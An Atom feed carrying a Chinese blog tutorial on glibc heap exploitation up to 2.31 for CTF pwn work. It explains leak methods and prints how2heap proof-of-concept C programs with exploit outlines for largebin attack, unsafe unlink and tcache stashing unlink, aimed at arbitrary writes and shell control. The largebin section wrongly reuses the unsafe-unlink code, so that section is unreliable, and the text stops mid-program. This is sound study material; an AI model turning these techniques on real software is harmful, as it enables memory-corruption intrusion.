<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>V3rdant</title>
  
  
  <link href="http://v3rdant.cn/atom.xml" rel="self"/>
  
  <link href="http://v3rdant.cn/"/>
  <updated>2023-06-21T06:55:15.885Z</updated>
  <id>http://v3rdant.cn/</id>
  
  <author>
    <name>V3rdant</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>heap-exploation-up-to-2.31</title>
    <link href="http://v3rdant.cn/2023/06/21/[Pwn]-heap-exploation-up-to-2.31/"/>
    <id>http://v3rdant.cn/2023/06/21/[Pwn]-heap-exploation-up-to-2.31/</id>
    <published>2023-06-20T16:00:00.000Z</published>
    <updated>2023-06-21T06:55:15.885Z</updated>
    
    <content type="html"><![CDATA[<h1>Basic Knowledge</h1><h6 id="bins">bins:</h6><table><thead><tr><th>unsorted bin</th><th>fast bin</th><th>small bin</th><th>large bin</th></tr></thead><tbody><tr><td>NO LIMITATION</td><td>0x20-0x80</td><td>&lt;0x400</td><td>&gt;0x400</td></tr></tbody></table><h2 id="libc-version">libc version</h2><p>ubuntu-libc version</p><ul><li>2.23=“16.04”</li><li>2.24=“17.04”</li><li>2.26=“17.10”</li><li>2.27=“18.04”</li><li>2.28=“18.10”</li><li>2.29=“19.04”</li><li>2.30=“19.10”</li><li>2.31=“20.04”</li><li>2.32=“20.10”</li><li>2.33=“21.04”</li><li>2.34=“22.04”</li></ul><h1>Overview</h1><p>在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。</p><p>本文主要<strong>针对glibc2.30及以上</strong>有着tcache的版本。<s>因为低于2.27版本的堆笔者根本不会</s></p><p>正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。</p><p>在笔者看来，一次堆利用主要分为一下几个步骤：</p><ul><li>漏洞的发现</li><li>地址的泄露</li><li>利用漏洞控制目标地址内容</li><li>攻击的对象</li></ul><p>因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。</p><p>笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节–去看这些技巧的提出者大师傅可能讲述地要比我更完善–而着重于贯穿各个技巧的联系， <s>才不是因为笔者懒呢</s> ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。</p><h1>基本漏洞</h1><p><strong>UAF</strong><br>在free时没有清空指针，可以重利用指针。<br>在没有<code>Edit</code> 的情况下，可以通过 <code>double free</code> 进行堆块重叠。</p><p><strong>overflow</strong><br>溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用</p><p><strong>off-by-one</strong>/<strong>off-by-null</strong><br>这里主要针对2.29-2.31版本, <a href="https://www.anquanke.com/post/id/236078#h3-4">2.29-2.31版本的off-by-null</a> ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。</p><p><strong>漏洞的利用</strong><br>上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流<br>考虑:</p><ul><li>one gadget</li><li>system(“/bin/sh”)</li><li>orw</li></ul><h1>leak</h1><p>一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。</p><p>一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。</p><p>也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。</p><p>而在没有show相关输出chunk内容的函数时，考虑通过<code>_IO_2_1_stdout_</code> 来leak<br>基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak</p><h1>Basic tricks up to 2.30</h1><p>在2.30以上的版本，我认为需要掌握的基本技术主要包括:</p><ul><li>[x] largebin attack</li><li>[x] tcache stashing unlink attack</li><li>[x] unsafe unlink</li><li>[x] tcache poison</li><li>[x] house of botcake</li><li>[x] decrypt safe_unlink</li><li>[x] house of pig</li><li>[x] 堆布局</li></ul><p>这里结合how to heap源代码分析</p><h2 id="Largebin-attack">Largebin attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x420</span>) <span class="comment"># chunk A</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#And another chunk to prevent consolidate</span></span><br><span class="line">malloc(<span class="number">0x410</span>) <span class="comment"># chunk B</span></span><br><span class="line"><span class="comment">#This chunk should be smaller than [p1] and belong to the same large bin</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#And another chunk to prevent consolidate</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">0x438</span>)</span><br><span class="line"><span class="comment">#Allocate a chunk larger than [p1] to insert [p1] into large bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#Free the smaller of the two --&gt; [p2]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(target2-<span class="number">0x20</span>))</span><br><span class="line"><span class="comment">#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址</span></span><br><span class="line">malloc(<span class="number">0x438</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(recover)*<span class="number">2</span>) <span class="comment"># 修复large bin attack </span></span><br></pre></td></tr></table></figure><p><strong>修复:</strong><br>可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算</p><p><strong>限制:</strong></p><ul><li>需要一次UAF</li></ul><p><strong>效果:</strong></p><ul><li>在2.30以上可以在任意地址写入一个libc地址</li></ul><h2 id="unsafe-unlink">unsafe unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 0 ptr store in &amp;ptr</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x420</span>) <span class="comment"># not in fastbin or tcache</span></span><br><span class="line">malloc(<span class="number">0x420</span>) </span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(&amp;ptr-<span class="number">0x18</span>)+p64(&amp;ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*k + p64(fake_prev_size)+p64(size)) <span class="comment"># fakesize = 0x420-0x10</span></span><br><span class="line"><span class="comment"># need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0</span></span><br></pre></td></tr></table></figure><p><strong>限制:</strong></p><ul><li>overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate</li><li>主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构</li></ul><p><strong>效果:</strong></p><ul><li>可以将ptr处地址改写为&amp;ptr-8</li></ul><h2 id="tcache-stashing-unlink">tcache stashing unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the 